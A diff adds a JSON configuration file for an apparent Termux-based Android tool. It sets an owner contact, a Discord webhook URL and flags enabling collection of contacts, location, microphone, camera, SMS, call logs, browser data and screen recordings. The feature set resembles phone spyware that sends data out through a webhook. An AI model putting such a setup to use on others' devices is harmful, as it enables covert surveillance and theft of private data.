@@ -1,0 +1,21 @@
+{
+    "owner": {
+        "phone": "+94771234567",
+        "email": "owner@gmail.com"
+    },
+    "webhook_url": "https://discord.com/api/webhooks/...",
+    "cloud_folder": "termux_cloud_data",
+    "features": {
+        "contacts": true,
+        "location": true,
+        "microphone": true,
+        "camera": true,
+        "sms": true,
+        "call_logs": true,
+        "browser": true,
+        "screen_record": true,
+        "file_list": true,
+        "vpn_detection": true,
+        "auto_backup": true
+    }
+}
